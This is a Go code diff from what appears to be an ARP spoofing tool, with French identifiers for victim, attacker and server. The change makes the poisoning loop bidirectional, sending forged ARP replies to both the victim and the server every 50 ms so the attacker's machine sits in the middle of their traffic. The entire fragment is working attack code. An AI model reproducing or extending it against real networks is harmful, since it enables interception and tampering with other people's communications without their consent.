@@ -10,16 +10,20 @@ import (
 	"github.com/google/gopacket/pcap"
 )
 
-func launchPoisoning(ip_to_usurpate net.IP, my_mac net.HardwareAddr, ip_target net.IP, mac_target net.HardwareAddr, ctx context.Context) {
+func launchPoisoning(global *global, ctx context.Context) {
 	handle := createPoisoningHandle("eth0")
+	handle2 := createPoisoningHandle("eth0")
 	defer handle.Close()
+	defer handle2.Close()
 	count := 0
 	for {
 		select {
 		case <-ctx.Done():
 			return
 		default:
-			poisoningARP(handle, ip_to_usurpate, my_mac, ip_target, mac_target)
+			poisoningARP(handle, global.victime_ip, global.attaquant_mac, global.serveur_ip, global.serveur_mac)
+			// probleme ici sur un des cote
+			poisoningARP(handle2, global.serveur_ip, global.attaquant_mac, global.victime_ip, global.victime_mac)
 			printPoisoning(&count)
 			time.Sleep(50 * time.Millisecond)
 		}
